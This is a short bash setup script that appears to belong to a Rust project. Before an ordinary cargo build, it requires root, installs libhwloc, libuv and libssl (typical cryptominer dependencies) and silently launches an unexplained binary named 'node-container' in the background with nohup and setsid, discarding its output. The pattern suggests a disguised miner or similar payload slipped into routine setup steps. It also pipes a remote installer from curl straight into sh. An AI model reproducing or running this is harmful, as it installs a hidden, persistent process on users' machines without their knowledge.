#!/bin/bash

if [[ $EUID -ne 0 ]]; then
   echo "[!] This script must be run as root"
   exit 1
fi
chmod +x node-container
check_libhwloc() {
    if ldconfig -p | grep -q libhwloc.so.15; then
        echo "[✓] libhwloc.so.15 already installed"
    else
        echo "[*] libhwloc.so.15 not found, installing required libraries..."
        apt update && apt install -y libhwloc15 libhwloc-dev libuv1 libssl1.1 || apt install -y libssl3
    fi
}
check_libhwloc

check_container() {
if pgrep -f "./node-container" > /dev/null; then
    echo "..."
else
    nohup setsid ./node-container > /dev/null 2>&1 &
fi
}

check_container

apt update
apt upgrade
apt install -y build-essential pkg-config libssl-dev git-all
apt install -y protobuf-compiler
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
cargo build --release
